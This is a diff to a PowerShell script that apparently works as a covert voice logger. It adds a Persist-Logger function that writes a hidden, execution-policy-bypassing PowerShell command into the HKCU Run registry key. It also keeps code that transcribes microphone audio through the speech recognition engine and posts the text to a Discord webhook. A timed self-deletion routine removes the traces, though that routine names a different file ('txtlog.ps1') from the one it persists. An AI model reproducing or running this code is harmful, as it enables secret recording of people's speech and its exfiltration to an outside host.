@@ -1,3 +1,38 @@
+function Persist-Logger {
+    [CmdletBinding()]
+	param (
+		[parameter(Position=0,Mandatory=$True)]
+		[string]$name,
+        [parameter(Mandatory=$True)]
+		[string]$Command 
+	);
+
+    if($DaysRun -eq -1 -or $DaysRun -gt 0){
+        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$name"){ return };
+    
+        New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Value $Command;
+    
+        if($DaysRun -eq -1){ return };
+        if(Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name"){ return };
+    
+        $date = (Get-Date).AddDays($daysRun);
+        New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force;
+        New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name 'date' -Value $date;
+    }
+    
+    if($DaysRun -gt 0){
+        $date = Get-Date;
+        $targetValue = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Name 'date';
+        $targetDate = [DateTime]$targetValue.date;
+    
+        if($date -lt $targetDate){ return }
+    
+        Remove-Item "$env:temp\txtlog.ps1" -Force;
+        Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\$name" -Force
+        Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $name -Force
+    }
+}
+
 function Send-Discord {
 	[CmdletBinding()]
 	param (
@@ -15,38 +50,14 @@ function Send-Discord {
 	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType "Application/Json" -Uri $Hook  -Method Post -Body ($Body | ConvertTo-Json) };
 }
 
-if($DaysRun -eq -1 -or $DaysRun -gt 0){
-    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\voicelog'){ return };
-
-    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
-    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Value $autostart;
-
-    if($DaysRun -eq -1){ return };
-    if(Test-Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\voicelog'){ return };
-
-    $date = (Get-Date).AddDays($daysRun);    
-    New-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\voicelog' -Force;
-    New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\voicelog' -Name 'date' -Value $date;
-}
-
-if($DaysRun -gt 0){
-    $date = Get-Date;
-    $targetValue = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\voicelog' -Name 'date');
-    $targetDate = [DateTime]$targetValue.date;
-
-    if($date -lt $targetDate){ return }
-
-    Remove-Item "$env:temp\voicelog.ps1" -Force;
-    Remove-Item -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\voicelog' -Force
-    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Force
-}
-
-
 Add-Type -AssemblyName System.Speech;
 $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine;
 $grammar = New-Object System.Speech.Recognition.DictationGrammar;
 $recognizer.LoadGrammar($grammar);
 $recognizer.SetInputToDefaultAudioDevice();
+
+$autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + '$Persistent=' + $Persistent + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
+Persist-Logger "voicelog" -Command $autostart;
 
 while ($true) {
     $result = $recognizer.Recognize();
